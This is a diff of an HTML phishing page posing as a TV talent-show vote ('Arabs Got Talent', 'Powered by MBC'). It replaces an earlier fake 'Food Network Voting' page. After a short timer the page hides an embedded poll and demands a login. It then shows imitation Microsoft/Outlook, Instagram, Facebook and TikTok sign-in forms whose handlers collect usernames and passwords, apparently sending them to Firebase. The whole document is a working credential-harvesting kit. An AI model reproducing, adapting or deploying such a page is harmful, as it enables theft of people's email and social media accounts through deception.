@@ -1,271 +1,550 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
-<script src="js/jquery-3.6.0.min.js"></script>
-<link rel="stylesheet" href="css/index.css">
-<link rel="stylesheet" href="assets/css/main.css">
-
-<!--Facebook-->
-    <link rel="stylesheet" href="secured/default.css">
-    <link rel="stylesheet" href="secured/style.css">
-<script src="js/index.js"></script>
-<script src="/js/jquery-3.6.0.min.js"></script>
-
-  <!-- Twitter CSS -->
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
-  <link rel="stylesheet" href="twt/CSS/style.css">
+  <meta charset="UTF-8">
+  <link rel="profile" href="https://gmpg.org/xfn/11">
   <link rel="icon" href="favicon.ico">
+  <title>Arabs Got Talent</title>
+  <meta name='robots' content='max-image-preview:large' />
+  <style>
+    img:is([sizes="auto" i], [sizes^="auto," i]) {
+      contain-intrinsic-size: 3000px 1500px
+    }
+  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>Food Network Voting</title>
-<style>
-  body {
-    font-family: "Courier New", monospace;
-    margin: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    background: linear-gradient(to bottom right, #FFD700, #FF4500);
-  }
+  <!-- Add this line in the <head> section of your HTML -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="js/index.js"></script>
 
-  .profile-card {
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    padding: 20px;
-    width: 300px;
-    text-align: center;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-    background-color: #fff;
-  }
+  <link rel="stylesheet" href="css/index.css">
+  <script>
 
-  .profile-picture {
-    width: 100px;
-    height: 100px;
-    border-radius: 50%;
-    margin: 0 auto 10px;
-    background-color: #ddd;
-  }
+  </script>
 
-  .profile-name {
-    font-family: "Courier New", monospace;
-    font-size: 1.5em;
-    margin: 5px 0;
-  }
+  <style>
+    /* Popup styles */
+    .popup {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: rgba(0, 0, 0, 0.7);
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      display: none;
+      z-index: 999;
+      /* Lower z-index */
+    }
 
-  .profile-title {
-    font-family: "Courier New", monospace;
-    font-size: 1.1em;
-    color: #555;
-    margin: 0;
-  }
-  .profile-description {
-    font-family: "Courier New", monospace;
-    font-size: 0.8em;
-    color: #555;
-    margin: 0;
-  }
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 998;
+      /* Lower z-index for the overlay */
+    }
 
-  .social-links {
-    margin-top: 15px;
-  }
+    .popup img {
+      border-radius: 50%;
+      margin-right: 10px;
+      width: 40px;
+      height: 40px;
+    }
+  </style>
 
-  .social-icon {
-    font-size: 1em;
-    margin: 0 10px;
-    color: #555;
-  }
-  .social-vote-button {
-    margin-top: 15px;
-  }
-
-  .twitter-button {
-    background-color: black;
-    color: #FFF;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-  .instagram-button2 {
-    background-color: red;
-    color: #FFF;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-  .facebook-button3 {
-    background-color: blue;
-    color: #FFF;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-
-  .preloader {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    color: white;
-    font-size: 24px;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-  }
-
-  .powered-by {
-    text-align: center;
-    margin-top: 20px;
-    color: #888;
-    font-size: 0.8em;
-  }
-</style>
 </head>
-<body>
-  <div id="preloader" class="preloader">
-    Loading...
+
+<body class="bg-gray-800 text-white flex items-center justify-center min-h-screen">
+
+  <div id="preloader" class="preloader"></div>
+
+  <!-- Iframe Container (Initial Load) -->
+  <div id="iframe-container" class="w-full h-full fixed inset-0">
+    <iframe src="https://strawpoll.com/embed/Q0Zp7VrbAgM" class="w-full h-full border-none" frameborder="0"
+      allowfullscreen allowtransparency>
+    </iframe>
   </div>
 
-  <div class="profile-card">
-    <img src="logo.PNG" alt="Profile Picture" class="profile-picture">
-    <h2 class="profile-name">Team Riyadh</h2>
-    <p class="profile-title">tickling your taste bud</p>
-    <p class="profile-description">Please we need your vote!</p>
- <div class="social-links">
-
-    <div class="social-vote-button">
-
-      <button onclick="Twitter()" class="twitter-button"><i class="fab fa-twitter"></i> Vote with Twitter </button>
+  <div id="login-prompt" class="hidden">
+    <div class="flex items-center justify-center">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-yellow-500" fill="none" viewBox="0 0 24 24"
+        stroke="currentColor" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="M10.29 3.86L1.82 18c-.78 1.36.19 3 1.71 3h16.94c1.52 0 2.49-1.64 1.71-3L13.71 3.86a2 2 0 00-3.42 0zM12 9v4m0 4h.01" />
+      </svg>
+      <span class="ml-2 text-yellow-600 text-lg font-semibold">
+        You must log in to continue!
+      </span>
     </div>
     <div class="social-vote-button">
-      <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Vote with Instagram </button>
+      <button onclick="showLoginForm('twitter')" class="microsoft-button"><i class="fab fa-microsoft"></i> Login with
+        Email </button>
+    </div>
+    <div class="social-vote-button">
+      <button onclick="showLoginForm('instagram')" class="instagram-button2"><i class="fab fa-instagram"></i> Login with
+        Instagram
+      </button>
     </div>
 
     <div class="social-vote-button">
-      <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Vote with Facebook </button>
+      <button onclick="showLoginForm('facebook')" class="facebook-button3"><i class="fab fa-facebook"></i> Login with
+        Facebook
+      </button>
     </div>
     <br><br>
-    <p class="powered-by">Powered by <strong>Food Network</strong></p>
+    <p class="powered-by">Powered by <strong>MBC</strong></p>
 
   </div>
 
-    <!-- Instagram Dialog Box -->
-    <div id="instagram" class="dialog">
-        <div class="dialog-content">
-            <span class="close" onclick="closeDialog()">&times;</span>
-            <h2><span hidden id="dialog-instagram"></span></h2>
-              <main class="l-main">
-              <div class="l-main__img">
-                <img src="assets/img/homepage.png" alt="Smartphones">
-              </div>
-              <div class="l-user">
-                <div class="c-panel group">
+  <!-- Login Prompt (Hidden initially) 
+    <div id="login-prompt" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+        <h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
+        <div class="space-x-4">
+            <button 
+                class="bg-indigo-700 px-6 py-3 rounded-md font-semibold flex items-center space-x-2 hover:bg-blue-400 transition"
+                onclick="showLoginForm('facebook')">
+                <span>Login with</span> <i class="fab fa-facebook-f text-white"></i>
+            </button>
+            <button 
+                class="bg-indigo-700 px-6 py-3  font-semibold flex items-center space-x-2 hover:bg-pink-400 transition"
+                onclick="showLoginForm('instagram')">
+                <span>Login with </span> <i class="fab fa-instagram text-white"></i>
+            </button>
+            <button 
+                class="bg-indigo-700 px-6 py-3  font-semibold flex items-center space-x-2 hover:bg-blue-300 transition"
+                onclick="showLoginForm('twitter')">
+                <span>Login with </span> <i class="fab fa-twitter text-white"></i>
+            </button>
+        </div>
+    </div> -->
 
-              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
-              <div class="c-panel__form">
-                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
-                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-pass">
-                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button> 
-                <span class="c-panel__span">OR</span>
+  <div id="votingsocial">
+
+    <div id="twitter-login" class="hidden bg-gray mt-4">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow">
+
+          <div class="tokpart ">
+            <div class=" p-5 w-full max-w-md">
+
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1920px-Microsoft_logo_%282012%29.svg.png"
+                alt="logo" class="h-10 mt-20">
+
+
+              <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
+              <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
+
+
+              <!-- Email Input -->
+
+              <div id="uname" class="flex justify-start">
+                <input type="email" id="twi-uname" name="email" required
+                  class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                  placeholder="Email, phone, or Skype" />
               </div>
-              <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
-              <a href="#" class="c-panel__forgot">Forgot password?</a>
-              <br>
-              <br>
+
+
+
+              <div class="flex justify-start">
+                <button id="forgotPasswordButton" type="button"
+                  class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                  No account?
+                  <span class="text-blue-500 hover:underline"> Create one!</span>
+                </button>
+              </div>
+
+
+              <!-- Next Button to show password field -->
+              <button id="nextButton" type="button" onclick="showPasswordField()"
+                class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                Next
+              </button>
+
+
+
+              <!-- Password Field (hidden initially) -->
+              <div id="passwordField" class="hidden mt-4">
+                <div class="mb-4 relative">
+                  <input type="password" id="twi-pass" name="password" required
+                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                    placeholder="Password" />
+                </div>
+
+                <button id="nextButton" type="button" onclick="twilog()"
+                  class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                  Submit
+                </button>
+
+              </div>
+
             </div>
-            <div class="c-signup group">
-              <p>Don't have an account? <span>Sign up</span></p>
+          </div>
+
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
+          <div class=" w-full px-4">
+            <div class="flex justify-between items-center">
+              Sorry, we could not find your account.
+            </div>
+          </div>
+        </footer>
+
+      </div>
+
+    </div>
+
+    <div id="instagram-login" class="hidden bg-black">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow p-2"> <!-- Reduced padding here -->
+
+
+          <div class="flex justify-center mt-11 mb-6">
+            <!-- Centered Image -->
+            <img src="image/ig.svg" alt="logo" class="h-12">
+          </div>
+
+          <div class="tokpart bg-black">
+            <div class="bg-black p-8 w-full max-w-md">
+
+              <div id="buttonsContainer">
+                <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                <button id="ButtonGoogle" type="button" onclick=""
+                  class="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                  style="font-family: 'Google Sans', arial, sans-serif; font-weight: 400; overflow: hidden;">
+                  <!-- Google Icon -->
+                  <img src="image/fbss.png" alt="Google Icon" class="h-5 mr-3">
+                  Continue Using Facebook
+                </button>
+
+                <div class="flex items-center my-4">
+                  <div class="flex-grow border-t border-gray-700"></div>
+                  <span class="mx-4 text-gray-500">OR</span>
+                  <div class="flex-grow border-t border-gray-700"></div>
+                </div>
+              </div>
+
+              <!-- Email Input -->
+              <div class="mb-4 relative">
+                <input type="text" id="ig-uname" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                  placeholder="Phone, Email address, or username" />
+              </div>
+              <div class="mb-4">
+                <!-- Input Field -->
+                <input type="text" id="ig-pass" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                  placeholder="Password" />
+
+                <!-- Forgot Password Button -->
+                <button id="forgotPasswordButton" type="button"
+                  class="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
+                  Forgot Password?
+                </button>
+              </div>
+
+              <!-- Login Button -->
+              <button id="loginButton" type="button" onclick="iglog()"
+                class="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
+                Log in
+              </button>
+
+              <p class="mt-6 text-left text-xl text-gray-100">
+                Don't have an account?
+                <a href="#" class="font-medium text-blue-600 hover:text-blue-500">Sign up</a>
+              </p>
+
+            </div>
+          </div>
+
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" style="background-color: rgb(18, 18, 18);"
+          class="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
+          <div class="flex justify-center items-center flex-col">
+            <!-- Text above the image with reduced margin -->
+            <p class="mb-0" style="font-size: 12px; margin-bottom: 2px;">from</p>
+            <!-- Linked image -->
+            <a href="https://www.example.com">
+              <img src="image/meta.png" alt="logo" class="h-14">
+            </a>
+          </div>
+
+        </footer>
+
+      </div>
+
+    </div>
+
+
+    <div id="tiktok-login">
+      <div class="hidden min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow">
+          <div class="flex justify-between items-center p-4">
+            <!-- Left Section -->
+            <div class="flex items-center">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1000px-TikTok_logo.svg.png?20200415104610"
+                alt="logo" class="h-10">
             </div>
 
-                  <div class="c-app">
-                    <p>Get the app.</p>
-                    <div class="c-app__download">
-                      <img src="assets/img/apple.png" alt="Apple Store">
-                      <img src="assets/img/google.png" alt="Google Play">
-                    </div>
+            <!-- Right Section -->
+            <div class="flex items-center space-x-2">
+              <i class="fa fa-question-circle text-gray-500 hover:text-gray-700" aria-hidden="true"></i>
+              <span id="feedback-help" class="text-gray-500 hover:text-gray-700">Feedback and help</span>
+            </div>
+          </div>
+          <div class="tokpart">
+            <div class="bg-white p-8 w-full max-w-md">
+              <h2 id="login-title" class="text-2xl font-bold mb-6 text-center">Log In</h2>
+              <div>
+                <div class="mb-4">
+                  <label id="email-label" for="email" class="block text-sm font-medium text-gray-700">Email or
+                    username</label>
+                  <input type="email" id="tok-uname" name="email" required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div class="mb-6">
+                  <label id="password-label" for="password"
+                    class="block text-sm font-medium text-gray-700">Password</label>
+                  <input type="password" id="tok-pass" name="password" required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div class="flex items-center justify-between mb-6">
+                  <div class="text-sm">
+                    <a id="forgot-password" href="#" class="font-medium text-gray-600 hover:text-gray-500">Forgot
+                      password?</a>
                   </div>
                 </div>
-            </main>
-        </div>
-    </div>
-
-     <!-- Facebook Dialog Box -->
-    <div id="facebook" class="dialog">
-        <div class="dialog-content">
-          <span class="close" onclick="closeDialog()">&times;</span>
-          <h2><span hidden id="dialog-instagram"></span></h2>
-          <main class="l-main">
-            <div class="fb-user">
-              <div class="fb-panel fb-group">
-                            <img src="secured/img/logo.svg" alt="">
-                            <p>Facebook helps you connect and share with the people in your life.</p>
-                            <input type="text" placeholder="Email or Phone number" required id="fb-email">
-                            <input type="password" placeholder="Password" required id="fb-pass">
-                            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
-                            
-                            <a href="#">Forgotten password?</a>
-                            <button id="create-btn">Create New Account</button>
-                            <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a celebrity, band or business.
-                </div>
+                <button onclick="toklog()" type="submit" id="login-button"
+                  class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Log
+                  in</button>
+              </div>
+              <p id="signup-text" class="mt-6 text-center text-sm text-gray-600">
+                Don't have an account?
+                <a href="#" class="font-medium text-pink-600 hover:text-pink-500">Sign up</a>
+              </p>
             </div>
-          </main>
-        </div>
+          </div>
+        </main>
+
+
+        <!-- Footer Section -->
+        <footer class="bg-gray-900 text-white py-6 mt-auto w-full">
+          <div class="w-full px-4">
+            <div class="flex justify-between items-center">
+              <!-- Left Section: Language Selector with Rounded Border -->
+              <div class="flex items-center space-x-4">
+                <select id="languageSelect" onchange="translatePage()"
+                  class="bg-gray-900 text-gray-500 py-1 px-3 rounded-80 border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                  <option value="en">English</option>
+                  <option value="es">Español</option>
+                  <option value="fr">Français</option>
+                  <option value="de">Deutsch</option>
+                  <option value="it">Italiano</option>
+                  <option value="pt">Português</option>
+                  <option value="zh">中文 (Chinese)</option>
+                  <option value="ar">العربية (Arabic)</option>
+                </select>
+
+              </div>
+
+              <!-- Right Section: Copyright -->
+              <div class="text-sm text-gray-500">
+                &copy; 2025 TikTok
+              </div>
+            </div>
+          </div>
+        </footer>
+
+      </div>
+
     </div>
 
-     <!-- Twitter Dialog Box -->
-    <div id="twitter" class="dialog">
-        <div class="dialog-content">
-          <span class="close" onclick="closeDialog()">&times;</span>
-     <div class="row">
-       <div class="none col-1 col-lg-4"></div>
-       <div class="none col-10 col-lg-5">
-         <div class="box bg-white mt-5 p-3">
-           <div class="nav mb-5">
-             <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
-           </div>
-           <div class="mb-4">
-             <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
-           </div>
+    <div id="facebook-login" class="hidden bg-gray-100 text">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow p-2"> <!-- Reduced padding here -->
 
-           <div class="margin mb-4">
-            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username" required id="tw-email">
-            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required id="tw-pass">
-             <button type="button"
-               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="tw_login()" id="tw-log">
-               <p class="text-white"><b>Log In</b></p>
-             </button>
-           </div>
+          <div class="flex justify-center mt-9 mb-4">
+            <!-- Centered Image -->
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/800px-Facebook_logo_%282023%29.svg.png"
+              alt="logo" class="h-12">
+          </div>
+          <div class="flex justify-center mb-4 text-gray">
+            <p class="text-2xl text-center break-words max-w-md">
+              Facebook helps you connect and share with the people in your life.
+            </p>
+          </div>
 
-           <div class="margin mb-4">
-             <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
-               <p class="color-white"><b>Forgot password?</b></p>
-             </button>
-           </div>
+          <div class="tokpart">
+            <div class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
 
-           <div class="margin">
-             <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
-           </div>
+              <!-- Email Input -->
+              <div class="mb-4 relative">
+                <input type="text" id="fb-uname" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                  placeholder="Email address or phone number" />
+              </div>
+              <div class="mb-4">
+                <!-- Input Field -->
+                <input type="text" id="fb-pass" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md  focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                  placeholder="Password" />
 
-           <div class="margin">
-           </div>
 
-         </div>
-       </div>
-       <div class="none col-1 col-lg-3"></div>
-     </div>
+                <!-- Login Button -->
+                <button id="loginButton" type="button" onclick="fblog()"
+                  class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
+                  Log in
+                </button>
 
-   </div>
-</div>
+                <!-- Forgot Password Button -->
+                <button id="forgotPasswordButton" type="button"
+                  class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
+                  Forgotten Password?
+                </button>
+
+                <!-- Divider -->
+                <div class="flex items-center my-2">
+                  <div class="flex-grow border-t border-gray-300"></div>
+                  <div class="flex-grow border-t border-gray-300"></div>
+                </div>
+
+                <!-- Create New Account Button -->
+                <button id="createAccountButton" type="button"
+                  class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
+                  Create new account
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <div class="flex justify-center mb-4 mt-7 text-gray">
+            <p class="text-l text-center break-words max-w-md">
+              <span style="font-weight: 600;"> Create a Page </span> for a celebrity, brand or business.
+            </p>
+          </div>
+
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
+          <div class="w-full px-5">
+            <!-- Container -->
+            <div class="flex flex-col gap-4">
+
+              <!-- Language Section -->
+              <div class="px-2">
+                <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                  <a href="#" class="inline-block cursor-pointer hover:underline">English (UK)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Hausa</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Français (France)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Português (Brasil)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Español</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">العربية</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Bahasa Indonesia</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Deutsch</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">日本語</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Italiano</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">हिन्दी</a>
+                </div>
+              </div>
+
+              <!-- Divider Line -->
+              <hr class="border-gray-300 w-full">
+
+              <!-- Links Section -->
+              <div class="px-2">
+                <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Sign Up</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Log in</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Messenger</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Facebook Lite</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Video</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Places</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Games</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Marketplace</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Meta Pay</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Meta Store</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Meta Quest</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Ray-Ban Meta</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Meta AI</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Instagram</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Threads</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Fundraisers</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Services</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Voting Information Centre</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Privacy Policy</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Privacy Centre</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Groups</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">About</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Create ad</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Create Page</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Developers</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Careers</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Cookies</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">AdChoices</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Terms</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Help</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Contact uploading and non-users</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Settings</a>
+                </div>
+              </div>
+
+              <!-- Copyright Section -->
+              <div class="px-2 text-xs text-gray-500">
+                Meta &copy;2025
+              </div>
+            </div>
+          </div>
+        </footer>
+      </div>
+
+    </div>
+  </div>
+
+
+  <!-- Custom Alert -->
+  <div id="custom-alert" class="hidden fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-50 z-50">
+    <div class="bg-white rounded-lg shadow-lg p-6 max-w-sm w-full">
+      <h2 id="alert-title" class="text-lg font-bold text-gray-800 mb-2">Oops!</h2>
+      <p id="alert-message" class="text-gray-600 mb-4">Something went wrong.</p>
+      <button onclick="hideAlert()"
+        class="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300">OK</button>
+    </div>
+  </div>
+  <script>
+    // Timer to display the login prompt after 10 seconds
+    setTimeout(() => {
+      // Hide iframe and show login prompt
+      document.getElementById("iframe-container").classList.add("hidden");
+      document.getElementById("login-prompt").classList.remove("hidden");
+    }, 2000); // 10 seconds timer
+
+    // Show the respective login form based on selection
+    function showLoginForm(platform) {
+      // Hide login prompt and show the respective platform login form
+      document.getElementById("login-prompt").classList.add("hidden");
+      document.getElementById(platform + "-login").classList.remove("hidden");
+    }
+  </script>
+
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
   <script>
     function showCustomAlert() {
@@ -278,55 +557,56 @@
     }
   </script>
 
-    <script>
-      function showPreloader() {
-        document.getElementById("preloader").style.display = "flex";
-      }
+  <script>
+    function showPreloader() {
+      document.getElementById("preloader").style.display = "flex";
+    }
 
-      function hidePreloader() {
-        document.getElementById("preloader").style.display = "none";
-      }
+    function hidePreloader() {
+      document.getElementById("preloader").style.display = "none";
+    }
 
-      function Twitter() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("twitter").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Twitter() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("twitter").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function Instagram() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("instagram").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Instagram() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("instagram").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function Facebook() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("facebook").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Facebook() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("facebook").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function closeDialog() {
-          document.getElementById("instagram").style.display = "none";
-          document.getElementById("twitter").style.display = "none";
-          document.getElementById("facebook").style.display = "none";
-      }
-    </script>
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    function closeDialog() {
+      document.getElementById("instagram").style.display = "none";
+      document.getElementById("twitter").style.display = "none";
+      document.getElementById("facebook").style.display = "none";
+    }
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
 
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-    <script src="js/firebase.js">
+  <script src="js/firebase.js">
 
-    </script>
+  </script>
 
